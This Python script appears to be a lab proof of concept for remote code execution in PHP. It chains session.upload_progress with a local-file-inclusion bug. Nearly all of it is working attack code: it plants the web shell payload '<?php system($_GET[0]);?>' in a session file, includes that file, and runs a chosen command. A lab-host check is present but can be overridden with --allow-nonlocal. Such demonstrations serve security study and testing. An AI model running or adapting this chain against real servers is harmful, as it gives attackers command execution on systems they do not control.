#!/usr/bin/env python3
"""Local demonstration of the session.upload_progress + LFI chain.

This is the known, app-level chain, not a reproduction of the claimed
PHP-core UAF. The target app in ../lfi-demo deliberately includes a
user-supplied path. Run only against the local lab.
"""

from __future__ import annotations

import argparse
import http.client
import secrets
import sys
from urllib.parse import urlencode, urlparse

ALLOWED = {"127.0.0.1", "localhost", "::1", "php-vuln", "nginx"}


def post_multipart(host: str, port: int, path: str, sid: str, payload: str) -> tuple[int, list[tuple[str, str]], bytes]:
    boundary = "----lfi" + secrets.token_hex(8)
    body = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"{payload}\r\n"
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="f"; filename="a.txt"\r\n'
        "Content-Type: text/plain\r\n\r\n"
        "X\r\n"
        f"--{boundary}--\r\n"
    ).encode()
    conn = http.client.HTTPConnection(host, port, timeout=20)
    conn.request(
        "POST",
        path,
        body=body,
        headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Cookie": f"PHPSESSID={sid}",
            "Content-Length": str(len(body)),
        },
    )
    resp = conn.getresponse()
    data = resp.read()
    status = resp.status
    headers = resp.getheaders()
    conn.close()
    return status, headers, data


def get(host: str, port: int, path: str, sid: str) -> tuple[int, bytes]:
    conn = http.client.HTTPConnection(host, port, timeout=20)
    conn.request("GET", path, headers={"Cookie": f"PHPSESSID={sid}"})
    resp = conn.getresponse()
    data = resp.read()
    status = resp.status
    headers = resp.getheaders()
    conn.close()
    return status, headers, data


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://127.0.0.1:8087/index.php")
    parser.add_argument("--session-path", default="/tmp")
    parser.add_argument("--command", default="id")
    parser.add_argument("--allow-nonlocal", action="store_true")
    parser.add_argument("--follow-cookie", action="store_true")
    args = parser.parse_args()

    parsed = urlparse(args.target)
    if parsed.hostname not in ALLOWED and not args.allow_nonlocal:
        raise SystemExit(f"refusing non-lab host {parsed.hostname!r}")
    host = parsed.hostname
    port = parsed.port or 80
    script = parsed.path or "/index.php"

    sid = "lfi" + secrets.token_hex(12)
    payload = "<?php system($_GET[0]);?>"
    print(f"[*] upload {args.target} sid={sid}")
    print(f"[*] payload={payload}")
    status, headers, body = post_multipart(host, port, script, sid, payload)
    print(f"[*] upload status={status} body={body[:80]!r}")
    if args.follow_cookie:
        for key, value in headers:
            if key.lower() == "set-cookie" and value.startswith("PHPSESSID="):
                sid = value.split(";", 1)[0].split("=", 1)[1]
                print(f"[*] followed Set-Cookie PHPSESSID={sid}")
                break

    session_file = args.session_path.rstrip("/") + "/sess_" + sid
    query = urlencode({"file": session_file, "0": args.command})
    lfi_path = script + "?" + query
    print(f"[*] include {session_file}")
    status, _, body = get(host, port, lfi_path, sid)
    text = body.decode("utf-8", "replace")
    print(f"[*] lfi status={status} bytes={len(body)}")
    print(text[:800])
    hit = "uid=" in text
    print(f"[*] command output present: {hit}")
    return 0 if hit else 1


if __name__ == "__main__":
    sys.exit(main())
